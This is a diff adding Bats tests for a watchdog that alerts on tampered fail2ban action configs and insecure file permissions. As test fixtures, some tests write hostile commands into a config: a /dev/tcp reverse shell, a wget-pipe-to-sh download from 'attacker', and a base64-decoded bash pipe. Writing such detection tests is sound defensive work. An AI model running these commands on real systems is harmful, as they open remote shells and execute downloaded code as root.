@@ -130,3 +130,69 @@ seed_benign() {
     [ "${status}" -ne 0 ]
     cap | grep -q '"severity":"alert"'
 }
+
+@test "baseline is chmod 0600 (confidentiality — fail2ban-action inventory enumerates root-exec-per-ban surface)" {
+    seed_benign
+    run_wd
+    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
+}
+
+@test "INVARIANT (reverse-shell pattern in actionban): /dev/tcp reverse shell → alert" {
+    seed_benign
+    run_wd
+    printf '[Definition]\nactionban = bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (wget-pipe-sh in actionstart): wget bootstrap variant → alert" {
+    seed_benign
+    run_wd
+    printf '[Definition]\nactionstart = wget -qO- http://attacker/p | sh\n' > "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (base64-decode-pipe in actionunban): obfuscation variant → alert" {
+    seed_benign
+    run_wd
+    printf '[Definition]\nactionunban = echo YmFzaCAtaQ== | base64 -d | bash\n' > "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (action under /var/tmp → alert): writable-root expansion" {
+    seed_benign
+    run_wd
+    printf '[Definition]\nactionstart = /var/tmp/.f2b-start\n' > "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (group-writable action conf): group-writable → alert above world-writable bar" {
+    seed_benign
+    run_wd
+    chmod 0664 "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
+
+@test "INVARIANT (pre-existing world-writable action conf): baseline_initial fires alert at install-time" {
+    seed_benign
+    chmod 0666 "${CONF}"
+    run_wd
+    cap | grep -q '"event":"baseline_initial"'
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
+
+@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
+    seed_benign
+    run_wd
+    main_count=$(cap | grep -cE '^-t selfdef-fail2ban-action -- ')
+    [ "${main_count}" = "1" ]
+}
